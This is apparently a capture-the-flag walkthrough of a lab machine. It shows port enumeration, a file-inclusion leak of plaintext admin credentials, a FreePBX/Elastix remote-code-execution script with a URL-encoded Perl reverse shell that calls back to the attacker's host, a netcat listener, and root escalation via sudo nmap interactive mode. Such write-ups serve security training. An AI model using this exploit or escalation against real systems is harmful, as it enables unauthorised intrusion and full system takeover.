# IP Address: 10.10.10.7

# Enumeration
```
┌──(code㉿kali)-[~]
└─$ nmapAutomator.sh -H 10.10.10.7 -t all


PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp       syn-ack Postfix smtpd
80/tcp    open  http       syn-ack Apache httpd 2.2.3
110/tcp   open  pop3       syn-ack Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
111/tcp   open  rpcbind    syn-ack 2 (RPC #100000)
143/tcp   open  imap       syn-ack Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
443/tcp   open  ssl/http   syn-ack Apache httpd 2.2.3 ((CentOS))
878/tcp   open  status     syn-ack 1 (RPC #100024)
993/tcp   open  ssl/imap   syn-ack Cyrus imapd
995/tcp   open  pop3       syn-ack Cyrus pop3d
3306/tcp  open  mysql      syn-ack MySQL (unauthorized)
4190/tcp  open  sieve      syn-ack Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp? syn-ack
4559/tcp  open  hylafax    syn-ack HylaFAX 4.3.10
5038/tcp  open  asterisk   syn-ack Asterisk Call Manager 1.1
10000/tcp open  http       syn-ack MiniServ 1.570 (Webmin httpd)
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix



```

### HTTP (80)
Elastix VoIP service is served on TCP port 80 which is vulnerable to local file inclusion. We can grab the amportal.conf file with Burp (so that it's formatted) and see the database and admin user credentials in plaintext.

![dashboard](https://github.com/codetantrum/walkthroughs/blob/master/Beep/images/Pasted%20image%2020211118194810.png)

asteriskuser:jEhdIekWmdjE
admin:jEhdIekWmdjE

After logging in as admin, we find a user, fanis, and their PBX extension at PBX tab >> Batch of Extensions >> Download the current extensions in CSV format.

A Google search reveals an unauthenticated RCE vulnerability with the FreePBX (Asterisk) component. We find an exploit here https://www.nmmapper.com/st/exploitdetails/18650/26436/freepbx-2100-elastix-220-remote-code-execution/ and edit it for our purposes.

Original:
```
import urllib
rhost="172.16.254.72"
lhost="172.16.254.223"
lport=443
extension="1000"

# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

urllib.urlopen(url)
```

Edited:
```
import ssl						# EDIT 1
import urllib
rhost="10.10.10.7"				# EDIT 2
lhost="10.10.14.17"				# EDIT 3
lport=4488						# EDIT 4
extension="233"					# EDIT 5 (fanis' extension)

ctx = ssl.create_default_context()	# BEGIN EDIT 6
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE		# END EDIT 7

# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

urllib.urlopen(url, context=ctx)	# EDIT 8
```

Note: We needed to import the SSL library to have the ability to ignore the certificate errors served. 

Setting up a netcat listener on port 4488, we launch the exploit and catch a reverse shell as asterisk.
```
┌──(code㉿kali)-[~]
└─$ nc -nlvp 4488
listening on [any] 4488 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.7] 50263
id
uid=100(asterisk) gid=101(asterisk)

```

user.txt

![user.txt](https://github.com/codetantrum/walkthroughs/blob/master/Beep/images/Pasted%20image%2020211119131650.png)


# Privilege Escalation

Check sudo permissions of asterisk and find that user can run many commands as root without password. Run nmap interactively and spawn a root shell.
```
python -c 'import pty;pty.spawn("/bin/bash")'
bash-3.2$ sudo -l
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
bash-3.2$ sudo /usr/bin/nmap --interactive
sudo /usr/bin/nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
sh-3.2# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

```


# Proof

root.txt

![root.txt](https://github.com/codetantrum/walkthroughs/blob/master/Beep/images/Pasted%20image%2020211119133031.png)
